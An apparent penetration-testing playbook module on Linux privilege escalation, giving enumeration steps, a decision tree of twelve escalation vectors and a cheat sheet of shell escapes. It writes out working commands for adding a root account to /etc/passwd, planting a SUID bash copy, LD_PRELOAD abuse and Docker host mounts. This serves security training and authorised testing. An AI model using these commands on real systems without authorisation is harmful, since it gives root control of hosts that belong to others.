# Module 09: Linux Privilege Escalation

## When to Use This Module
Use this module when you have a non-root shell on a Linux system. The goal is to escalate privileges to root (or another higher-privileged user) to gain full control of the host.

## Prerequisites
- Working shell on target (reverse/bind/SSH) — from Module 05
- Basic command execution
- Internet access for tool transfer (or upload method)

## Entry Check

```
Shell obtained on Linux host?
├── Run initial enumeration:
│   ├── whoami / id → Current user + groups
│   ├── hostname → Check system name
│   ├── uname -a → Kernel version
│   ├── cat /etc/os-release → OS version
│   ├── sudo -l → Sudo privileges
│   ├── ls -la /home/ → Other users
│   ├── ip addr → Network interfaces
│   └── ps aux → Running processes
│
├── Automated enumeration:
│   ├── Transfer linpeas.sh → Run it
│   ├── Transfer LinEnum.sh → Run it
│   └── Transfer pspy64 → Monitor processes in background
│
├── Check for domain join (AD)?
│   ├── realm list, sssd, /etc/krb5.keytab
│   └── If domain joined → Also check Module 11
│
└── Begin systematic check of each privesc vector below
```

## PrivEsc Vector Decision Tree

```
Need to escalate privileges?
├── Check EACH of these vectors (most common → least):
│
│   1. SUDO privileges
│   ├── sudo -l → See what user can run as root
│   │   ├── (ALL) ALL → sudo su / sudo -i (instant root)
│   │   ├── Specific commands → Check GTFOBins for each
│   │   └── No sudo → Move to next vector
│   └── GTFOBins: https://gtfobins.github.io/
│
│   2. SUID binaries
│   ├── find / -user root -perm -4000 -type f 2>/dev/null
│   ├── For EACH unusual SUID → Check GTFOBins
│   └── Common SUID exploits: base64, pkexec, nmap, vim, less
│
│   3. Cron jobs / Scheduled tasks
│   ├── cat /etc/crontab, ls -la /etc/cron*
│   ├── pspy64 → Monitor cron execution
│   ├── Writable cron script? → Inject reverse shell
│   ├── Wildcard abuse? → tar --checkpoint injection
│   └── Path writable? → Create malicious script with cron name
│
│   4. Capabilities
│   ├── getcap -r / 2>/dev/null
│   ├── Dangerous caps:
│   │   ├── cap_setuid → vim.basic -c ':!sh'
│   │   ├── cap_dac_override → Modify protected files
│   │   ├── cap_sys_admin → Namespace abuse
│   │   └── cap_setgid → Group-based access
│   └── Check each against GTFOBins
│
│   5. Kernel exploits
│   ├── uname -a → searchsploit linux kernel <version>
│   ├── Common CVEs:
│   │   ├── CVE-2021-4034 (PwnKit) → pkexec
│   │   ├── CVE-2022-0847 (Dirty Pipe) → kernel 5.8-5.17
│   │   ├── CVE-2021-3156 (Baron Samedit) → sudo heap overflow
│   │   └── CVE-2021-22555 → Netfilter heap overflow
│   └── WARNING: Kernel exploits can crash the system
│
│   6. Writable /etc/passwd
│   ├── ls -la /etc/passwd → writable?
│   ├── openssl passwd -1 'password' → Generate hash
│   └── echo 'root2:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
│
│   7. LD_PRELOAD / LD_LIBRARY_PATH
│   ├── sudo -l shows env_keep+=LD_PRELOAD?
│   ├── gcc -shared -fPIC -o /tmp/pe.so /tmp/pe.c -nostartfiles
│   └── sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
│
│   8. PATH abuse
│   ├── Writable directory in PATH?
│   └── echo '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /dir/cmd
│
│   9. Shared Object hijack
│   ├── readelf -d <binary> | grep RUNPATH
│   ├── ldd <binary> → Look for missing/writable .so
│   └── Create malicious .so and place in writable RUNPATH
│
│   10. NFS root_squash
│    ├── showmount -e target → Check exports
│    ├── Mount NFS share as root on attacker
│    └── Create SUID binary on the share
│
│   11. Docker / LXD groups
│    ├── docker run -v /:/mnt --rm -it alpine chroot /mnt sh
│    ├── lxd init, lxc image import → mount host filesystem
│    └── Check for docker.sock: /var/run/docker.sock
│
│   12. Miscellaneous
│    ├── Tmux session hijack (weak permissions)
│    ├── Logrotate exploit (versions 3.8.6-3.18.0)
│    ├── Python library hijack (writable site-packages)
│    ├── Restricted shell escape (rbash)
│    └── Passive traffic capture → tcpdump
│
└── None worked? → Re-enumerate, check for missed vectors
    ├── Did you check all cron jobs?
    ├── Did you monitor processes for scripts?
    ├── Did you check all users' home directories?
    └── Did you check for SSH keys in other users' dirs?
```

## Automated Enumeration Tools

```bash
# Run these on target after transfer
./linpeas.sh | tee linpeas_output.txt
./LinEnum.sh | tee linenum_output.txt

# Process monitor (run in background, watch for cron jobs)
./pspy64 -pf -i 1000

# Check all SUID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# Check capabilities
getcap -r / 2>/dev/null

# Check writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Check writable directories in PATH
find / -writable -type d 2>/dev/null
```

## Common GTFOBins Escapes

```bash
# sudo-based
sudo vim -c ':!sh'
sudo less /etc/passwd → !/bin/sh
sudo nmap --interactive → !sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo man man → !/bin/bash

# SUID-based (same commands, no sudo needed)
./vim -c ':!sh'
./find . -exec /bin/sh \; -quit
```

## Cross-References
- For post-exploitation after root → [Module 13: Post-Exploitation](../modules/13-post-exploitation.md)
- For AD enumeration if domain-joined → [Module 11: Active Directory](../modules/11-active-directory.md)
- For cracking found hashes → [Module 06: Password Attacks](../modules/06-password-attacks.md)
- For finding pivot routes → [Module 12: Lateral Movement & Pivoting](../modules/12-lateral-pivot.md)

## Output Summary
- [ ] Initial enumeration complete (users, groups, OS, kernel)
- [ ] sudo -l checked
- [ ] SUID binaries enumerated and checked
- [ ] Cron jobs enumerated and monitored
- [ ] Capabilities checked
- [ ] Kernel exploit attempted (if viable)
- [ ] PATH, LD_PRELOAD, writable files checked
- [ ] Docker/LXD groups checked
- [ ] All findings documented
- [ ] Root access achieved (or confirmed no path exists)
